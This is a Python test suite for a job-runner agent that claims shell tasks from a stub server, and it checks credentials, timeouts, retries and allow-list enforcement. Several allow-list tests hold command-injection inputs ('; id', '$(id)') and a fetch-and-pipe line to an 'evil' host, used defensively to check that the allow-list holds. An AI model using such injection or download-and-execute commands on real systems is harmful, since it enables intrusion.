#!/usr/bin/env python3
# SPDX-FileCopyrightText: 2026 Joachim Klahr
# SPDX-License-Identifier: AGPL-3.0-or-later
"""Tests for the runner agent, against a stub Dazyflow server.

    python3 runner/test_dzrunner.py

A real HTTP server on a loopback port rather than a mocked urllib: the agent's
whole job is to talk to a server over HTTP, and a test that mocks that away
would be testing the parts that were never in doubt. This exercises the actual
requests — the bearer header, the 204-means-nothing-to-do branch, the result
payload — which is where the contract with the daemon actually lives.
"""

import json
import os
import subprocess
import sys
import tempfile
import threading
import unittest
from unittest import mock
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))
import dzrunner  # noqa: E402


class StubDaemon(BaseHTTPRequestHandler):
    """Enough of the daemon to hold up its end of the four endpoints."""

    # Set by the test before the server starts.
    state = None

    def _read(self):
        n = int(self.headers.get("Content-Length") or 0)
        return json.loads(self.rfile.read(n) or b"{}")

    def _send(self, status, body=None):
        payload = json.dumps(body).encode() if body is not None else b""
        self.send_response(status)
        if payload:
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        if payload:
            self.wfile.write(payload)

    def do_POST(self):  # noqa: N802 — BaseHTTPRequestHandler's naming
        s = self.state
        body = self._read()

        if self.path == "/api/v1/runner/register":
            s["registered"] = body
            if body.get("token") != "dzrt_good":
                self._send(401, {"error": "nope"})
                return
            self._send(200, {"name": body["name"], "credential": "dzrc_secret"})
            return

        # Everything below needs the credential, exactly as the daemon does.
        if self.headers.get("Authorization") != "Bearer dzrc_secret":
            s["unauthorized"] = s.get("unauthorized", 0) + 1
            self._send(401, {"error": "bad credential"})
            return

        if self.path == "/api/v1/runner/claim":
            s["claims"] = s.get("claims", 0) + 1
            if s["queue"]:
                self._send(200, s["queue"].pop(0))
            else:
                self._send(204)
            return

        if self.path.endswith("/progress"):
            s["beats"] = s.get("beats", 0) + 1
            self._send(204)
            return

        if self.path.endswith("/result"):
            s["result_attempts"] = s.get("result_attempts", 0) + 1
            if s.get("reject_results"):
                self._send(409, {"error": "this task is no longer yours"})
                return
            if s.get("fail_results", 0) > 0:
                s["fail_results"] -= 1
                self._send(503, {"error": "try again"})
                return
            s["results"].append(body)
            self._send(204)
            return

        self._send(404, {"error": "no such path"})

    def log_message(self, *_args):
        pass  # keep the test output readable


def serve(state):
    StubDaemon.state = state
    srv = HTTPServer(("127.0.0.1", 0), StubDaemon)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    return srv, f"http://127.0.0.1:{srv.server_port}"


class AgentTest(unittest.TestCase):
    def setUp(self):
        self.state = {"queue": [], "results": []}
        self.srv, self.url = serve(self.state)
        # shutdown stops serving; server_close releases the socket. Without the
        # second the test run fills with ResourceWarnings.
        self.addCleanup(self.srv.server_close)
        self.addCleanup(self.srv.shutdown)
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.cfg_path = str(Path(self.tmp.name) / "runner.json")

    def register(self, token="dzrt_good", labels=("linux",)):
        return dzrunner.load_or_register(self.cfg_path, self.url, token, "box", list(labels))

    # ---- registration -------------------------------------------------

    def test_registers_and_saves_the_credential(self):
        cfg = self.register()
        self.assertEqual(cfg["credential"], "dzrc_secret")
        self.assertEqual(self.state["registered"]["labels"], ["linux"])
        # --tags is the flag the docs and the web UI use; --labels is the older
        # spelling of the same thing, and both have to land in the same place or
        # one of them silently registers a machine with no tags.
        for flag in ("--tags", "--labels"):
            args = dzrunner.build_parser().parse_args([flag, "a,b"])
            self.assertEqual(args.labels, "a,b", flag)
        # The agent reports its version so the admin list can say which one a
        # machine is running.
        self.assertEqual(self.state["registered"]["version"], dzrunner.VERSION)

        saved = json.loads(Path(self.cfg_path).read_text())
        self.assertEqual(saved["credential"], "dzrc_secret")

    def test_credential_file_is_not_world_readable(self):
        self.register()
        mode = Path(self.cfg_path).stat().st_mode & 0o777
        self.assertEqual(mode, 0o600, f"credential saved {oct(mode)}")

    def test_the_credential_is_never_briefly_world_readable(self):
        # Writing it and chmod-ing on the next statement leaves a window in
        # which anyone on the machine can read it, and the credential never
        # rotates — whoever wins that race keeps it. Checked by writing under a
        # permissive umask, which is what exposed the window.
        old = os.umask(0o000)
        self.addCleanup(os.umask, old)
        path = Path(self.tmp.name) / "fresh" / "runner.json"
        dzrunner.save_config(path, {"credential": "dzrc_secret"})
        self.assertEqual(path.stat().st_mode & 0o777, 0o600)
        self.assertEqual(path.parent.stat().st_mode & 0o777, 0o700)

    def test_second_run_reuses_the_saved_credential(self):
        self.register()
        before = self.state["registered"]
        # A second start with no token must not re-register: doing so would mint
        # a second identity for one machine and orphan the first.
        cfg = dzrunner.load_or_register(self.cfg_path, self.url, "", "box", [])
        self.assertEqual(cfg["credential"], "dzrc_secret")
        self.assertIs(self.state["registered"], before)

    def test_a_bad_token_says_what_to_do(self):
        with self.assertRaises(SystemExit) as caught:
            self.register(token="dzrt_stale")
        msg = str(caught.exception)
        self.assertIn("not valid", msg)
        # The message has to name the fix, because the cause is invisible: the
        # token looks fine, it is just spent or expired.
        self.assertIn("once", msg)

    def test_register_only_registers_and_stops(self):
        # The installer's whole strategy rests on this: spend the token in the
        # operator's terminal, then hand systemd a service that needs no secret.
        self.state["queue"].append(
            {"id": "t1", "script": "printf nope", "timeout_seconds": 30}
        )
        # On a thread with a deadline: if --register-only ever stopped
        # stopping, main() would fall into the poll loop and this test would
        # hang instead of failing, reporting nothing about what broke.
        out = {}

        def go():
            out["rc"] = dzrunner.main([
                "--url", self.url, "--token", "dzrt_good",
                "--name", "box", "--config", self.cfg_path, "--register-only",
            ])

        t = threading.Thread(target=go, daemon=True)
        t.start()
        t.join(15)
        self.assertFalse(t.is_alive(), "--register-only did not exit; it entered the work loop")
        self.assertEqual(out.get("rc"), 0)
        # Registered...
        saved = json.loads(Path(self.cfg_path).read_text())
        self.assertEqual(saved["credential"], "dzrc_secret")
        # ...and did not touch the queue, which is what "only" means. A task
        # run here would execute before the service that is meant to own it
        # even exists.
        self.assertEqual(self.state["results"], [])

    def test_register_only_reports_a_bad_token_rather_than_exiting_zero(self):
        # If this returned 0 the installer would go on to write and start a
        # service for a machine that is not registered.
        with self.assertRaises(SystemExit):
            dzrunner.main([
                "--url", self.url, "--token", "dzrt_stale",
                "--name", "box", "--config", self.cfg_path, "--register-only",
            ])

    def test_first_run_without_a_token_explains_itself(self):
        with self.assertRaises(SystemExit) as caught:
            dzrunner.load_or_register(self.cfg_path, self.url, "", "box", [])
        self.assertIn("--token", str(caught.exception))

    # ---- the work loop ------------------------------------------------

    def test_runs_a_task_and_reports_the_output(self):
        cfg = self.register()
        self.state["queue"].append(
            {"id": "t1", "script": "printf hello", "timeout_seconds": 30}
        )
        dzrunner.Agent(cfg, []).run(once=True)

        self.assertEqual(len(self.state["results"]), 1)
        res = self.state["results"][0]
        self.assertEqual(res["exit_code"], 0)
        self.assertEqual(res["stdout"], "hello")

    def test_wired_input_arrives_on_stdin(self):
        cfg = self.register()
        self.state["queue"].append({"id": "t1", "script": "cat", "stdin": "from the flow"})
        dzrunner.Agent(cfg, []).run(once=True)
        self.assertEqual(self.state["results"][0]["stdout"], "from the flow")

    def test_a_failing_command_reports_its_exit_code_and_stderr(self):
        cfg = self.register()
        self.state["queue"].append(
            {"id": "t1", "script": "echo trouble >&2; exit 3"}
        )
        dzrunner.Agent(cfg, []).run(once=True)
        res = self.state["results"][0]
        self.assertEqual(res["exit_code"], 3)
        # The command's own stderr is the author's message about what went
        # wrong; losing it would leave them with only a number.
        self.assertIn("trouble", res["stderr"])

    def test_the_environment_carries_task_values(self):
        cfg = self.register()
        self.state["queue"].append(
            {"id": "t1", "script": "printf %s \"$MONTH\"", "env": {"MONTH": "march"}}
        )
        dzrunner.Agent(cfg, []).run(once=True)
        self.assertEqual(self.state["results"][0]["stdout"], "march")

    def test_a_command_that_never_ends_is_stopped(self):
        cfg = self.register()
        self.state["queue"].append({"id": "t1", "script": "sleep 30", "timeout_seconds": 1})
        dzrunner.Agent(cfg, []).run(once=True)
        res = self.state["results"][0]
        self.assertIn("still running", res.get("error", ""))

    def test_a_missing_program_is_a_command_failure_not_a_crash(self):
        cfg = self.register()
        self.state["queue"].append({"id": "t1", "script": "definitely-not-a-real-binary"})
        dzrunner.Agent(cfg, []).run(once=True)
        # The shell reports this as a non-zero exit, which is the right shape:
        # the agent ran what it was asked and the command failed.
        self.assertNotEqual(self.state["results"][0].get("exit_code"), 0)

    def test_an_empty_queue_is_not_an_error(self):
        cfg = self.register()
        agent = dzrunner.Agent(cfg, [])
        self.assertIsNone(agent.claim())
        self.assertEqual(self.state["claims"], 1)
        self.assertEqual(self.state["results"], [])

    def test_a_revoked_runner_is_told_to_re_register(self):
        cfg = self.register()
        cfg["credential"] = "dzrc_revoked"

        # Run it on a thread with a deadline rather than calling it directly.
        # If the agent stops recognising a 401 as terminal it retries forever,
        # and a direct call would HANG the suite instead of failing it — which
        # is worse than a red test, because nobody learns anything from it.
        # Found by mutating the 401 branch away and watching this test hang.
        outcome = {}

        def attempt():
            try:
                dzrunner.Agent(cfg, []).run(once=True)
                outcome["exit"] = None
            except SystemExit as e:
                outcome["exit"] = str(e)

        t = threading.Thread(target=attempt, daemon=True)
        t.start()
        t.join(timeout=15)
        self.assertFalse(
            t.is_alive(),
            "the agent kept polling with a dead credential instead of stopping",
        )
        self.assertIn("no longer registered", outcome.get("exit") or "")

    # ---- the allow-list -----------------------------------------------

    def test_the_allow_list_refuses_anything_else(self):
        cfg = self.register()
        self.state["queue"].append({"id": "t1", "script": "curl http://evil"})
        dzrunner.Agent(cfg, ["./fetch.sh"]).run(once=True)
        res = self.state["results"][0]
        # Refused locally, and reported as the agent's decision — the flow
        # author must know it never ran, not that it ran and failed.
        self.assertIn("not allowed", res["error"])
        self.assertNotIn("exit_code", res)

    def test_the_allow_list_permits_arguments(self):
        cfg = self.register()
        self.state["queue"].append({"id": "t1", "script": "printf %s allowed"})
        dzrunner.Agent(cfg, ["printf"]).run(once=True)
        self.assertEqual(self.state["results"][0]["stdout"], "allowed")

    def test_no_allow_list_permits_everything(self):
        # The default, and the reason the agent warns about it on every start.
        command, use_shell, refusal = dzrunner.plan("anything at all", [])
        self.assertIsNone(refusal)
        self.assertTrue(use_shell, "with no allow-list the flow's command goes to a shell")
        self.assertEqual(command, "anything at all")

    def test_an_empty_command_is_refused_when_restricted(self):
        self.assertIn("empty", dzrunner.plan("   ", ["ls"])[2])

    def test_an_allow_list_is_not_defeated_by_a_semicolon(self):
        # The documented hardening is `--allow ./fetch-invoices.sh`, and the
        # docs promise the runner "will then refuse anything else". Checking
        # the first word and then handing the string to a shell enforced
        # nothing: anyone with graph:edit could append `; curl evil | sh`.
        for tail in ("; id", "&& id", "| id", "$(id)", "`id`", "\nid"):
            with self.subTest(tail=tail):
                command, use_shell, refusal = dzrunner.plan("./ok.sh " + tail, ["./ok.sh"])
                self.assertIsNone(refusal, "the allowed program is still allowed")
                self.assertFalse(use_shell, "an allow-list means no shell, so this is not an operator")
                self.assertEqual(command[0], "./ok.sh")
                self.assertNotIn("id", command[:1])

    def test_an_allow_list_runs_the_command_directly(self):
        cfg = self.register()
        # With a shell this would print "one" and then run `id`. Without one,
        # the whole tail is arguments to echo.
        self.state["queue"].append({"id": "t1", "script": "echo one; id"})
        dzrunner.Agent(cfg, ["echo"]).run(once=True)
        self.assertEqual(self.state["results"][0]["stdout"].strip(), "one; id")

    def test_an_unparseable_command_is_refused_rather_than_guessed(self):
        self.assertIn("could not read", dzrunner.plan('./ok.sh "unclosed', ["./ok.sh"])[2])

    # ---- the step's choice of interpreter ------------------------------

    def test_a_python_script_runs_under_python(self):
        # The whole point of the choice: what is typed on the step is Python,
        # not something a shell would make sense of.
        cfg = self.register()
        self.state["queue"].append({
            "id": "t1",
            "shell": "python",
            "script": 'print("|".join(str(i * i) for i in range(4)))',
        })
        dzrunner.Agent(cfg, []).run(once=True)
        res = self.state["results"][0]
        self.assertEqual(res["exit_code"], 0, res)
        self.assertEqual(res["stdout"].strip(), "0|1|4|9")

    def test_the_chosen_interpreter_still_reads_standard_input(self):
        # The script travels in a file precisely so stdin stays free for the
        # value wired into the step. Sending it on stdin instead would silently
        # take that away.
        cfg = self.register()
        self.state["queue"].append({
            "id": "t1",
            "shell": "python",
            "stdin": "hello",
            "script": "import sys\nprint(sys.stdin.read().strip().upper())",
        })
        dzrunner.Agent(cfg, []).run(once=True)
        self.assertEqual(self.state["results"][0]["stdout"].strip(), "HELLO")

    def test_a_shell_the_agent_does_not_know_falls_back_to_the_machines_shell(self):
        # A newer server, or a typo that got past the step: do what the default
        # has always done rather than guess at an interpreter.
        cfg = self.register()
        self.state["queue"].append({"id": "t1", "shell": "erlang", "script": "printf hello"})
        dzrunner.Agent(cfg, []).run(once=True)
        self.assertEqual(self.state["results"][0]["stdout"], "hello")

    def test_the_script_file_is_removed_afterwards(self):
        cfg = self.register()
        self.state["queue"].append({
            "id": "t1",
            "shell": "python",
            "script": "import sys; print(sys.argv[0])",
        })
        dzrunner.Agent(cfg, []).run(once=True)
        path = self.state["results"][0]["stdout"].strip()
        self.assertTrue(path.endswith(".py"), path)
        self.assertFalse(Path(path).exists(), "the temporary script outlived the task")

    def test_an_allow_list_must_name_the_interpreter(self):
        # The ordinary check asks whether the script's first word is permitted,
        # which is the wrong question here: the program being started is the
        # interpreter. Answering the wrong question favourably would let a
        # runner allowed one shell script run any Python at all.
        _, _, refusal = dzrunner.plan_interpreter("python", ["./fetch.sh"])
        self.assertIn("not allowed", refusal)
        self.assertIn("python", refusal)

    def test_an_allow_list_that_names_the_interpreter_permits_it(self):
        prefix, suffix, refusal = dzrunner.plan_interpreter("python", ["python"])
        self.assertIsNone(refusal)
        self.assertEqual(suffix, ".py")
        self.assertTrue(prefix, "an argv that starts python")

    def test_an_interpreter_this_machine_does_not_have_is_named(self):
        with mock.patch.object(dzrunner.shutil, "which", return_value=None):
            _, _, refusal = dzrunner.plan_interpreter("node", [])
        self.assertIn("not installed", refusal)
        self.assertIn("node", refusal)

    # ---- reporting back -----------------------------------------------

    def test_output_larger_than_the_server_accepts_fails_the_step(self):
        # The server rejects a body over its cap, and the agent used to only
        # log that — so the task stranded and the step blamed a machine that
        # was online and had finished in two seconds. Trimmed here instead,
        # and failed rather than handed on: half a document that looks like a
        # success is worse than an error naming the limit.
        cfg = self.register()
        n = dzrunner.MAX_OUTPUT_BYTES + 5000
        self.state["queue"].append({"id": "t1", "script": f"head -c {n} /dev/zero | tr '\\0' x"})
        dzrunner.Agent(cfg, []).run(once=True)
        res = self.state["results"][0]
        self.assertLessEqual(len(res["stdout"]), dzrunner.MAX_OUTPUT_BYTES)
        self.assertIn("more than this runner can send back", res["error"])

    def test_a_result_is_retried_through_a_transient_failure(self):
        # The task is already done by this point, so giving up on the first
        # dropped packet fails a step for nothing.
        cfg = self.register()
        self.state["fail_results"] = 2  # two 503s, then accept
        self.state["queue"].append({"id": "t1", "script": "printf ok"})
        agent = dzrunner.Agent(cfg, [])
        agent._sleep = lambda _s: None  # no real backoff in a test
        agent.run(once=True)
        self.assertEqual(len(self.state["results"]), 1)
        self.assertEqual(self.state["results"][0]["stdout"], "ok")

    def test_a_refused_result_is_not_retried(self):
        # A 4xx is the server refusing on the merits. Retrying changes nothing
        # and only delays the agent's return to the queue.
        cfg = self.register()
        self.state["reject_results"] = True
        self.state["queue"].append({"id": "t1", "script": "printf ok"})
        agent = dzrunner.Agent(cfg, [])
        agent._sleep = lambda _s: None
        agent.run(once=True)
        self.assertEqual(self.state.get("result_attempts"), 1)

    def test_once_exits_on_an_empty_queue(self):
        # "--once: run one task and exit, for testing". Waiting forever on an
        # empty queue is the one thing it must not do.
        cfg = self.register()
        done = threading.Event()

        def go():
            dzrunner.Agent(cfg, []).run(once=True)
            done.set()

        threading.Thread(target=go, daemon=True).start()
        self.assertTrue(done.wait(10), "--once hung on an empty queue")

    # ---- names --------------------------------------------------------

    def test_a_hostname_is_made_acceptable_rather_than_rejected(self):
        # A dotted, capitalised hostname is normal and must not fail
        # registration.
        self.assertEqual(dzrunner.sanitize_name("Build-Box.Corp.LOCAL"), "build-box-corp-local")
        self.assertEqual(dzrunner.sanitize_name("---"), "runner")
        self.assertLessEqual(len(dzrunner.sanitize_name("x" * 200)), 64)


class ScriptTest(unittest.TestCase):
    """The file has to work as a script, not only as an import."""

    def test_help_runs(self):
        out = subprocess.run(
            [sys.executable, str(Path(__file__).parent / "dzrunner.py"), "--help"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        self.assertEqual(out.returncode, 0, out.stderr)
        self.assertIn("--token", out.stdout)


if __name__ == "__main__":
    unittest.main(verbosity=2)
